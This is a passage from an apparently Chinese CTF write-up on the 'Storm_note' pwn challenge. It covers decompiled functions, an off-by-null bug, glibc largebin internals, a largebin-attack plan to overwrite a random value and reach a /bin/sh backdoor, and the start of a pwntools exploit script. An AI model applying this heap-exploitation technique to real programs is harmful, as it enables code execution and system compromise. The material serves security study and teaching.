<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;If you can open the lock, I will let you in&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL) )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>add:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">alloc_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; note[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size ?&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">1048575</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      note[i] = <span class="built_in">calloc</span>(v1, <span class="number">1uLL</span>);</span><br><span class="line">      note_size[i] = v1;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>edit:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index ?&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    v2 = read(<span class="number">0</span>, note[v1], note_size[v1]);</span><br><span class="line">    *(note[v1] + v2) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>delete:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index ?&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(note[v1]);</span><br><span class="line">    note[v1] = <span class="number">0LL</span>;</span><br><span class="line">    note_size[v1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>漏洞在 edit 函数中，编辑一个堆块后，会在编辑的内容最后补零，导致了 off-by-null，off-by-null 的经典利用手段是构造堆块合并，从而修改 chunk 的结构。</p>
<p>另外查看程序的 init 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">init_proc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )                         <span class="comment">// 不会使用 fastbin</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap(<span class="number">0xABCD0000</span>LL, <span class="number">4096uLL</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != <span class="number">0xABCD0000</span>LL )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  result = read(fd, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">0x30</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里用到了一个特别的函数 mallopt，在网上搜索相关信息得知，这个函数是用来控制 malloc 各种参数的，比如可以使用它设置 fastbin 的最大值 MAX_FAST 等。mallopt(1, 0) 的含义是不使用 fastbin 链表，也就是说当释放一个本属于 fastbin 范围的 chunk，它不会进入到 fastbin，而是会进入 unsorted bin。</p>
<p>另外调用了 mmap 函数在 0xABCD0000 地址开辟了空间，并且读入了 0x30 大小的随机数，在 backdoor 函数中，如果能够猜对随机数，就能 getshell。</p>
<p>那么一个显然的思路就是通过利用漏洞来控制 mmap 的内存，修改其中的随机数，由于程序只存在 off-by-null 漏洞，并且禁用了 fastbin 链表，所以只能通过 largebin attack 获得任意地址写的能力。</p>
<p>简单说一下思路，先通过 off-by-null 来构造堆块重叠，在重叠的堆块中控制 largebin chunk 的 bk 和 bk_nextsize 这两个字段，当 largebin chunk 从 unsortedbin 中卸下并链接到 largebin 的过程中，会发生指针的读写，从而在 mmap 地址分配一个堆块，修改随机数为我们想要的值。</p>
<h2 id="What-is-largebin"><a href="#What-is-largebin" class="headerlink" title="What is largebin"></a>What is largebin</h2><p>知己知彼方能百战百胜，largebin 的结构和其他链表都不相同，而且更加复杂。</p>
<p>首先，largebin chunk 中有 fd 和 bk 指针，另外还有 fd_nextsize 和 bk_nextsize 这两个指针。</p>
<p>largebin 的结构：</p>
<p>largebin 也分为很多个 index，每个 index 的堆块处在一定的范围内，第一条链表编号为 64，范围是 [0x400, 0x440)，第二条是 65，范围是 [0x440, 0x480)，以此类推。</p>
<p>largebin 堆块可以理解为链表数组，chunk 的 size 按照从大到小顺序排列，largebin 维护了两个链表，一个是纵向的由 fd、bk 组成的普通链表，另一个是横向的由 fd_nextsize、bk_nextsize 组成的 size 链表。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/large_bin_attack1.png"
                     
                ></p>
<p>每一条纵向链表的 chunk size 是相同的。</p>
<p>当一个堆块被 free 之后(除 fastbin 之外)，会先进入到 unsortedbin 中，当再次分配堆块的时候，不符合分配大小的堆块就会被分别插入到对应的链表中去，当一个堆块被插入到 largebin 中时，对应的 glibc 源代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">  victim_index = smallbin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">  victim_index = largebin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">      fwd = bck;</span><br><span class="line">      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">        &#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">      bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<p>第一种情况，取出的 chunk size 比当前链表中最小的 chunk 还小，这时就可以直接将堆块插入到横向链表的最后，设置好 bk_nextsize、fd_nextsize 两个指针，这个插入过程和普通链表处理类似。</p>
<p>如果堆块的 size 比最小的堆块大一些，就需要从横向链表头部开始遍历，直到找到第一个 size 大于等于待插入 chunk 的链表。当找到这样一个链表之后，判断链表的 size 是否精确等于待插入 chunk 的 size，如果是，直接将这个 chunk 插入到当前纵向链表的第二个位置，否则(待插入 chunk 的 size 比当前纵向链表头结点的 size 大)会将新的 chunk 作为当前纵向链表的头结点，插入到横向链表中。</p>
<p>另外，如果 largebin 是空的，则直接将 chunk 的 fd_nextsize bk_nextsize 更新成自身。</p>
<p>以上就是堆块插入 largebin 的大致流程，首先处理  fd_nextsize  bk_nextsize  构成的横向链表，然后处理纵向链表。</p>
<p>总结出如下规则(相同idx下)</p>
<ul>
<li>按照大小从大到小排序</li>
<li>若大小相同,按照free时间排序</li>
<li>若干个大小相同的堆块,只有首堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>会指向其他堆块,后面的堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>均为0</li>
<li>size最大的chunk的<code>bk_nextsize</code>指向最小的chunk; size最小的chunk的<code>fd_nextsize</code>指向最大的chunk</li>
</ul>
<p>我们大致了解向 largebin 插入堆块的流程，但是 从 largebin 卸下堆块的时候也涉及一些有趣的地方。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;    <span class="comment">// 判断 nb 是不是 smallbin</span></span><br><span class="line">      bin = bin_at(av, idx);    <span class="comment">// 获取链表 (idx 是之前计算的 nb 在 largebin 链表的 index)</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;  <span class="comment">// 检查对应的链表是否为空，或者其中最大的堆块比 nb 还小？</span></span><br><span class="line"></span><br><span class="line">  victim = victim-&gt;bk_nextsize;</span><br><span class="line">  <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(nb)))    <span class="comment">// 开始遍历 largebin，尝试找到一个合适的堆块</span></span><br><span class="line">    victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">     list does not have to be rerouted.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">    victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">  remainder_size = size - nb;  <span class="comment">// 找到一个合适的堆块，计算一下切割后剩余的堆块大小</span></span><br><span class="line">  unlink(victim, bck, fwd);   <span class="comment">// 将这个堆块从 largebin 卸下</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Exhaust */</span></span><br><span class="line">  <span class="keyword">if</span> (remainder_size &lt; MINSIZE)  &#123;    <span class="comment">// 如果切割后剩下的堆块大小 小于最小的堆块(16 or 32) 这个堆块会直接返回给用户，例如 64 位系统，切割剩余的大小为 16，那么用户拿到的堆块中有16 个字节是多出来的(或者说是浪费掉的)</span></span><br><span class="line">    set_inuse_bit_at_offset(victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Split */</span></span><br><span class="line">  <span class="keyword">else</span> &#123;     <span class="comment">// 如果切割剩余的堆块大小大于 MINSIZE</span></span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">       have to perform a complete insert here.  */</span></span><br><span class="line">    bck = unsorted_chunks(av);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (fwd-&gt;bk != bck, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    remainder-&gt;bk = bck;</span><br><span class="line">    remainder-&gt;fd = fwd;</span><br><span class="line">    bck-&gt;fd = remainder;</span><br><span class="line">    fwd-&gt;bk = remainder;    <span class="comment">// 将切割剩余的部分插入到 unsortedbin 中</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;  <span class="comment">// 如果剩下的大小是 largebin，清除它的 fd_nextsize、bk_nextsize 指针(因为它们在 uunsortedbin 中无用)</span></span><br><span class="line">      &#125;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot(remainder, remainder_size);</span><br><span class="line">  &#125;</span><br><span class="line">  check_malloced_chunk(av, victim, nb);</span><br><span class="line">  <span class="type">void</span> *p = chunk2mem(victim);   <span class="comment">// 返回堆块</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>其中最为重要的就是 unlink 宏，定义如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">  FD = P-&gt;fd;                                                          \</span></span><br><span class="line"><span class="meta">  BK = P-&gt;bk;                                                          \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                \</span></span><br><span class="line"><span class="meta">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P); \</span></span><br><span class="line"><span class="meta">  <span class="keyword">else</span> &#123;                                                               \</span></span><br><span class="line"><span class="meta">    FD-&gt;bk = BK;                                                       \</span></span><br><span class="line"><span class="meta">    BK-&gt;fd = FD;                                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				       \</span></span><br><span class="line"><span class="meta">	&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;	       \</span></span><br><span class="line"><span class="meta">      assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);		       \</span></span><br><span class="line"><span class="meta">      assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);		       \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				       \</span></span><br><span class="line"><span class="meta">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       \</span></span><br><span class="line"><span class="meta">	<span class="keyword">else</span> &#123;							       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       \</span></span><br><span class="line"><span class="meta">	  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       \</span></span><br><span class="line"><span class="meta">	  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       \</span></span><br><span class="line"><span class="meta">	&#125;							       \</span></span><br><span class="line"><span class="meta">      &#125;	<span class="keyword">else</span> &#123;							       \</span></span><br><span class="line"><span class="meta">	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       \</span></span><br><span class="line"><span class="meta">	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       \</span></span><br><span class="line"><span class="meta">      &#125;								       \</span></span><br><span class="line"><span class="meta">    &#125;								       \</span></span><br><span class="line"><span class="meta">  &#125;                                                                    \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>unlink 对于普通堆块和 largebin 堆块有不同的操作，原因是 largebin 的结构比较特殊，为了提高堆块分配的效率，需要针对 largebin 进行优化。</p>
<p>当 unlink 一个 largebin chunk 的时候，首先判断 chunk 是否属于 largebin，并且需要满足 P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D;&#x3D; P ，P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D;&#x3D; P，这些判断条件与 unlink 一个正常堆块类似。接下来分成三种情况。</p>
<p>情况一：largebin 中只存在一组纵向链表，要 unlink 链表的首节点。</p>
<p>对应代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				       \</span><br><span class="line">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       \</span><br><span class="line">	  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       \</span><br></pre></td></tr></table></figure></div>


<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/large_bin_attack2.png"
                     
                ></p>
<p>情况二： largebin 中存在多组不同大小的纵向链表，要 unlink 其中一个纵向链表的首节点。</p>
<p>对应代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;							       \</span><br><span class="line">	  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       \</span><br><span class="line">	  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       \</span><br><span class="line">	  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       \</span><br><span class="line">	  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       \</span><br><span class="line">	&#125;							       \</span><br></pre></td></tr></table></figure></div>


<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/large_bin_attack3.png"
                     
                ></p>
<p>情况三：有多组不同大小的纵向链表，要 unlink 其中一个链表的首节点，但是这个链表只有一个 chunk。</p>
<p>对应代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;							       \</span><br><span class="line">	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       \</span><br><span class="line">	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       \</span><br><span class="line">      &#125;								       \</span><br></pre></td></tr></table></figure></div>

<p>这个比较简单，就不画图了。</p>
<p>从上面的例子来看，当从 largebin 中分配堆块的时候，首先要找到合适大小的纵向链表，由于每一条纵向链表的 chunk 大小都是相同的，所以只需取第一个 chunk 即可。当取出这个 chunk 的时候根据当前纵向链表情况不同有三种不同的处理办法，但实际上它们的原理是相同的，如果纵向链表有多个 chunk，那么直接将第二个 chunk 提前到横向链表中即可，如果没有多余的 chunk，就将这个纵向链表从横向链表中去除。</p>
<p>由于 unlink 的过程中会对 chunk 的 fd_nextsize 以及 bk_nextsize 进行读写，如果能够控制这些指针，就能构造类似 unlink 的效果，在任意地址写入堆的地址。</p>
<h2 id="漏洞利用思路分析"><a href="#漏洞利用思路分析" class="headerlink" title="漏洞利用思路分析"></a>漏洞利用思路分析</h2><p>构造两个 overlap largebin chunk，一个较大，一个较小，但是两个 chunk 的 size 要位于同一个 index 范围内。</p>
<p>先将较小的 chunk free，放在 largebin 中(单执行 free 操作 chunk 会进入到 unsortedbin 中，还需要再做一个 malloc 才能将不合适的 chunk 放在对应的链表中，具体可以参考 ptmalloc 的源代码)，此时，我们可以通过 overlap 修改这个 chunk 中的各种指针。然后将较大的 chunk free ，这个 chunk 会进入 unsortedbin，并且也能通过 overlap 修改其中的指针。</p>
<p>目的是伪造一种合法的条件，当较大的 chunk 从 unsortedbin 中取出插入 largebin 的过程中，会执行一系列指针操作，通过这些操作我们可以在 mmap 的区域写入 heap 的地址，由于 heap 地址最高字节比较固定(通常为 0x56 或 0x55 )，所以利用错位的技巧就能伪造出一个“合法的 size”，注意我们是利用 unsorted bin 插入 largebin 来实现任意地址写的，此时 unsorted bin 的 bk 指针已经被改写为 mmap 区域的地址，当触发 largebin attack 改写 mmap 区域地址之后， 就相当于将 mmap 区域链接到了 unsortedbin 中，在 ptmalloc 内部代码中会验证这块内存是否合法，由于必要参数已经提前伪造，所以可以将 mmap 这块内存返回给我们控制，进而修改随机数 getshell。</p>
<p>我借用梅子酒公众号上的 wp 来进行说明，首先封装一些函数</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./Storm_note&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;ctf1.linkedbyx.com&#x27;,10444)</span></span><br><span class="line"><span class="comment">#port:10444</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,mes</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">  p.send(mes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure></div>

<p>第一步是构造 overlap 的 chunk，初始状态分配了下面这些堆块</p>
